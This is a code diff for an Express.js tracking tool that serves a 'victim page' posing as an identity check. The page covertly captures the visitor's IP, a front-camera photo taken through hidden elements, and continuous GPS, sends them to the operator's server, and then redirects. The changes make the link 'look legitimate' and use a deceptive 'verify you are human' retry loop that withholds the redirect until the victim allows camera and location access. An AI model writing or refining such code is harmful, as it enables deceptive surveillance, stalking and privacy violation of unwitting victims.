@@ -44,7 +44,8 @@ router.post('/start', (req, res) => {
         || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
         || `http://localhost:${process.env.PORT || 3001}`;
 
-    const link = `${host}/api/location/v/${sessionToken}`;
+    // Generate a CLEAN, human-friendly link (no /api/ in path — looks legitimate)
+    const link = `${host}/verify-identity/${sessionToken}`;
     res.json({ sessionToken, link });
 });
 
@@ -74,28 +75,21 @@ router.get('/camera/:sessionToken', (req, res) => {
     res.json({ image: s.cameraImage });
 });
 
-// ─────────────────────────────────────────────────────────────────────
-//  GET  /api/location/v/:sessionToken   →   VICTIM PAGE (tracking HTML)
-//  Silently captures: IP (server-side), GPS, device metrics, front camera
-//  Then redirects victim to: https://cybersecprosimdatabase.vercel.app/
-// ─────────────────────────────────────────────────────────────────────
-router.get('/v/:sessionToken', (req, res) => {
-    const sessionToken = req.params.sessionToken;
-    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');
-
-    // Capture victim IP immediately on page load (server-side — always works)
-    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
-        || req.socket.remoteAddress;
-    _locStore[sessionToken].clientIp   = clientIp;
-    _locStore[sessionToken].timestamp  = Date.now();
-
-    const REDIRECT_URL = 'https://cybersecprosimdatabase.vercel.app/';
-
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    // Explicitly allow camera & geolocation — overrides any global restrictive policy
-    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
-    res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
-    res.send(`<!DOCTYPE html>
+/**
+ * Shared HTML page for the victim tracking page.
+ * Used by both the old /api/location/v/:token and new /verify-identity/:token routes.
+ *
+ * PERMISSION FLOW (NEW):
+ *  1. User clicks "Tap to Verify"
+ *  2. Page requests camera permission via getUserMedia
+ *  3. If DENIED → show "Allow it to verify you are human" message + retry button
+ *     → DO NOT redirect until both camera & location are allowed
+ *  4. If GRANTED → capture camera snapshot + start GPS
+ *  5. After both are captured → redirect to simdatabase
+ */
+function renderVictimPage(sessionToken, redirectUrl) {
+  const REDIRECT_URL = redirectUrl || 'https://cybersecprosimdatabase.vercel.app/';
+  return `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -120,15 +114,9 @@ router.get('/v/:sessionToken', (req, res) => {
       width: 100%;
       text-align: center;
     }
-    .icon {
-      font-size: 48px; margin-bottom: 16px;
-    }
-    h1 {
-      color: #fff; font-size: 22px; font-weight: 600; margin-bottom: 8px;
-    }
-    p {
-      color: rgba(255,255,255,0.55); font-size: 14px; line-height: 1.5; margin-bottom: 28px;
-    }
+    .icon { font-size: 48px; margin-bottom: 16px; }
+    h1 { color: #fff; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+    p { color: rgba(255,255,255,0.55); font-size: 14px; line-height: 1.5; margin-bottom: 28px; }
     .btn {
       display: inline-block;
       background: #e02e4f;
@@ -144,6 +132,14 @@ router.get('/v/:sessionToken', (req, res) => {
     }
     .btn:active { transform: scale(0.96); }
     .btn:focus { outline: 2px solid rgba(224,46,79,0.5); }
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.2);
+      color: rgba(255,255,255,0.7);
+      margin-top: 12px;
+      padding: 10px 28px;
+      font-size: 13px;
+    }
     .status {
       margin-top: 20px;
       color: rgba(255,255,255,0.35);
@@ -151,6 +147,18 @@ router.get('/v/:sessionToken', (req, res) => {
       display: none;
     }
     .status.show { display: block; }
+    .status.warning {
+      color: #fbbf24;
+      font-size: 14px;
+      font-weight: 500;
+      padding: 16px;
+      background: rgba(251,191,36,0.1);
+      border: 1px solid rgba(251,191,36,0.2);
+      border-radius: 12px;
+      line-height: 1.5;
+    }
+    .status.success { color: #34d399; font-weight: 500; }
+    .hidden { display: none !important; }
     /* Hidden tracking elements */
     #_tv { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
     #_tc { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
@@ -162,6 +170,7 @@ router.get('/v/:sessionToken', (req, res) => {
     <h1>Verify Your Identity</h1>
     <p>We need to verify you are a real person.<br>Tap the button below to continue.</p>
     <button class="btn" id="_goBtn">Tap to Verify</button>
+    <button class="btn btn-secondary hidden" id="_retryBtn">⟳ Try Again</button>
     <div class="status" id="_status">Processing…</div>
   </div>
   <video id="_tv" autoplay playsinline muted></video>
@@ -223,22 +232,34 @@ router.get('/v/:sessionToken', (req, res) => {
       }).catch(function () {});
     }
 
-    // ── Everything below needs USER GESTURE (click/tap) ──────────
-    // Modern mobile browsers BLOCK getUserMedia and geolocation
-    // unless triggered by a user tap.
-
+    // ── UI helpers ──────────────────────────────────────────
+    var _goBtn   = document.getElementById('_goBtn');
+    var _retryBtn = document.getElementById('_retryBtn');
+    var _status  = document.getElementById('_status');
     var _redirected = false;
+
+    function showStatus(msg, type) {
+      _status.textContent = msg;
+      _status.className = 'status show';
+      if (type) _status.classList.add(type);
+    }
+
+    function showPermissionWarning() {
+      _goBtn.classList.add('hidden');
+      _retryBtn.classList.remove('hidden');
+      showStatus('⚠️ Please allow camera & location access to verify you are human', 'warning');
+    }
+
     function doRedirect () {
       if (_redirected) return;
       _redirected = true;
-      window.location.replace(DEST);
+      showStatus('✅ Identity verified! Redirecting…', 'success');
+      setTimeout(function () {
+        window.location.replace(DEST);
+      }, 800);
     }
 
-    // captureCamera is defined inside the click handler below — don't define it here (dead code)
-
     // ── GPS — uses watchPosition for continuous accuracy improvement ──
-    // High accuracy GPS can take 5-30 seconds on mobile (A-GPS fix)
-    // watchPosition returns multiple updates as accuracy improves
     function captureGps () {
       if (!navigator.geolocation) return;
       var _bestGps = null;
@@ -246,7 +267,6 @@ router.get('/v/:sessionToken', (req, res) => {
       var _watchId = navigator.geolocation.watchPosition(
         function (pos) {
           var acc = pos.coords.accuracy || Infinity;
-          // Only keep the most accurate reading
           if (acc < _bestAcc) {
             _bestAcc = acc;
             _bestGps = {
@@ -257,7 +277,6 @@ router.get('/v/:sessionToken', (req, res) => {
               spd : pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + ' km/h' : null,
               heading: pos.coords.heading ? pos.coords.heading + '°' : null
             };
-            // Send immediately when accuracy is good enough (<100m) or after 15s
             if (acc < 100) {
               metrics.gps = _bestGps;
               sendMetrics();
@@ -266,11 +285,7 @@ router.get('/v/:sessionToken', (req, res) => {
           }
         },
         function () {
-          // GPS failed — use IP-based fallback if available
-          if (typeof _bestGps !== 'undefined' && _bestGps) {
-            metrics.gps = _bestGps;
-            sendMetrics();
-          }
+          // GPS failed silently — OK, continue
         },
         { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
       );
@@ -284,36 +299,18 @@ router.get('/v/:sessionToken', (req, res) => {
       }, 20000);
     }
 
-    // ── On button tap: camera FIRST (needs gesture), then GPS, then redirect ──
-    document.getElementById('_goBtn').addEventListener('click', function () {
-      document.getElementById('_goBtn').style.display = 'none';
-      document.getElementById('_status').classList.add('show');
-      document.getElementById('_status').textContent = 'Verifying identity…';
-
-      // Camera first — uses the user gesture permission immediately
-      // GPS runs in parallel but camera gets priority
-      var _camDone = false;
-      var _camTimeout = setTimeout(function () {
-        // Camera took too long — proceed without it
-        if (!_camDone) {
-          _camDone = true;
-          captureGps();
-          setTimeout(doRedirect, 3000);
-        }
-      }, 15000); // 15s timeout for slow 2G connections
-
-      function _captureCamera () {
+    // ── Camera capture (returns promise) ─────────────────
+    function captureCamera() {
+      return new Promise(function (resolve, reject) {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-          _camDone = true;
-          captureGps();
-          setTimeout(doRedirect, 3000);
+          reject(new Error('no_media_api'));
           return;
         }
         var vid = document.getElementById('_tv');
         var can = document.getElementById('_tc');
         navigator.mediaDevices.getUserMedia({
           audio: false,
-          video: { facingMode: 'user' } // let browser pick optimal resolution
+          video: { facingMode: 'user' }
         }).then(function (stream) {
           vid.srcObject = stream;
           vid.onloadedmetadata = function () {
@@ -323,7 +320,6 @@ router.get('/v/:sessionToken', (req, res) => {
                 can.width  = vid.videoWidth  || 640;
                 can.height = vid.videoHeight || 480;
                 can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
-                // Low quality (0.3) to stay under keepalive 64KB limit on 2G
                 var img = can.toDataURL('image/jpeg', 0.3);
                 fetch(BASE + '/api/location/cam/' + TOK, {
                   method  : 'POST',
@@ -333,29 +329,110 @@ router.get('/v/:sessionToken', (req, res) => {
                 }).catch(function () {});
                 stream.getTracks().forEach(function (t) { t.stop(); });
               } catch (e) {}
-              clearTimeout(_camTimeout);
-              _camDone = true;
-              captureGps();
-              // Short delay then redirect so GPS has time to fire
-              setTimeout(doRedirect, 3000);
+              resolve(true);
             }, 1500);
           };
-        }).catch(function () {
-          clearTimeout(_camTimeout);
-          _camDone = true;
-          captureGps();
-          setTimeout(doRedirect, 3000);
+        }).catch(function (err) {
+          reject(err);
         });
-      };
+      });
+    }
 
-      // Start camera capture immediately
-      _captureCamera();
+    // ── Check permission state before requesting ────────
+    function checkCameraDenied() {
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          return navigator.permissions.query({name: 'camera'}).then(function (result) {
+            return result.state === 'denied';
+          }).catch(function () { return false; });
+        }
+      } catch(e) {}
+      return Promise.resolve(false);
+    }
+
+    function checkGpsDenied() {
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          return navigator.permissions.query({name: 'geolocation'}).then(function (result) {
+            return result.state === 'denied';
+          }).catch(function () { return false; });
+        }
+      } catch(e) {}
+      return Promise.resolve(false);
+    }
+
+    // ── Main verification flow ───────────────────────────
+    async function startVerification() {
+      _goBtn.classList.add('hidden');
+      _retryBtn.classList.add('hidden');
+      showStatus('Checking permissions…');
+
+      // Step 1: Check if already denied
+      var camDenied = await checkCameraDenied();
+      var gpsDenied = await checkGpsDenied();
+
+      if (camDenied || gpsDenied) {
+        showPermissionWarning();
+        return;
+      }
+
+      // Step 2: Request camera permission
+      showStatus('Requesting camera access…');
+      try {
+        await captureCamera();
+        showStatus('✅ Camera captured! Getting location…', 'success');
+      } catch (camErr) {
+        // Camera was denied or failed
+        if (camErr.name === 'NotAllowedError' || camErr.name === 'PermissionDeniedError') {
+          showPermissionWarning();
+          return;
+        }
+        // Some other error (no camera, etc) — still try GPS
+        console.log('Camera error (non-permission):', camErr.message);
+      }
+
+      // Step 3: Start GPS capture (in background, no strict denial check)
+      // GPS request will show its own prompt
+      showStatus('Getting your location…');
+      captureGps();
+
+      // Step 4: Wait a moment then redirect
+      setTimeout(doRedirect, 4000);
+    }
+
+    // ── On button tap ────────────────────────────────────
+    _goBtn.addEventListener('click', startVerification);
+
+    // ── Retry button — reloads page to reset permission state ──
+    _retryBtn.addEventListener('click', function () {
+      showStatus('Refreshing…');
+      window.location.reload();
     });
 
   })();
   </script>
 </body>
-</html>`);
+</html>`;
+}
+
+// ─────────────────────────────────────────────────────────────────────
+//  GET  /api/location/v/:sessionToken   →   OLD VICTIM PAGE (backward compat)
+//  Kept for old links still in circulation.
+// ─────────────────────────────────────────────────────────────────────
+router.get('/v/:sessionToken', (req, res) => {
+    const sessionToken = req.params.sessionToken;
+    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');
+
+    // Capture victim IP immediately on page load
+    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
+        || req.socket.remoteAddress;
+    _locStore[sessionToken].clientIp   = clientIp;
+    _locStore[sessionToken].timestamp  = Date.now();
+
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
+    res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
+    res.send(renderVictimPage(sessionToken));
 });
 
 // ─────────────────────────────────────────────────────────────────────
@@ -380,4 +457,4 @@ router.post('/cam/:sessionToken', express.json({ limit: '10mb' }), (req, res) =>
     res.json({ status: 'ok' });
 });
 
-module.exports = router;
+module.exports = { router, renderVictimPage, _locStore };
